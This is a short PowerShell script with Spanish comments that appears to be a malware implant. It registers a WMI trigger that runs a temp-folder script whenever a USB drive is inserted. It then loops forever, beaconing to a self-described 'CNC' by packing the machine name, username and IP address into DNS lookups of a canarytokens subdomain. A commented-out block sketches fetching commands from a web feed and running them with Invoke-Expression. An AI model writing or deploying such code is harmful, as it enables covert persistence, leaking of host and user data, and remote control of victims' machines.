

# Define a WMI event query, that looks for new instances of Win32_LogicalDisk where DriveType is "2"
# http://msdn.microsoft.com/en-us/library/aa394173(v=vs.85).aspx
$Query = "select * from __InstanceCreationEvent within 5 where TargetInstance ISA 'Win32_LogicalDisk' and TargetInstance.DriveType = 2";

# Define a PowerShell ScriptBlock that will be executed when an event occurs
$Action = { & "%USERPROFILE%\AppData\Local\Temp\USBin.ps1";  };

# Create the event registration
Register-WmiEvent -Query $Query -Action $Action -SourceIdentifier USBFlashDrive;


#Bucle loop de cada hora


# Iniciar un bucle infinito que ejecuta el comando cada 24 hora
while ($true) {
    #Ping al CNC
    #Notificamos la Entrada al CNC
        $username = $env:USERNAME
    # Obtener la dirección IP de la máquina actual
        $ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString
    # Concatenar el subdominio con el nombre de usuario y la dirección IP
    $subdomain = "PING_$label.$env:COMPUTERNAME.$username.$ipAddress.G12.pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"
    # Realizar la consulta DNS
    $result = Resolve-DnsName -Name $subdomain 
    # Mostrar los resultados de la consulta DNS
if ($result) {
    Write-Host "La dirección IP del subdominio $subdomain es $($result.IPAddress)"
} else {
    Write-Host "No se pudo resolver la dirección IP del subdominio $subdomain"
}
    #Buscamos tareas que realizar....
    #TODO descargar de PASTEBIN y ejecutar
    #$content = Invoke-WebRequest -Uri "https://www.google.es/alerts/feeds/14322507702556587554/7498838164931141655" -UseBasicParsing
    #$patron = '(?<=#CUCHIROBIN )(.*)(?= #FIN)'
    #$resultado = [regex]::Match($content, $patron).Value
    #Invoke-Expression $resultado
    
    # Esperar una hora antes de volver a ejecutar el comando
    Start-Sleep -Seconds 3600
}
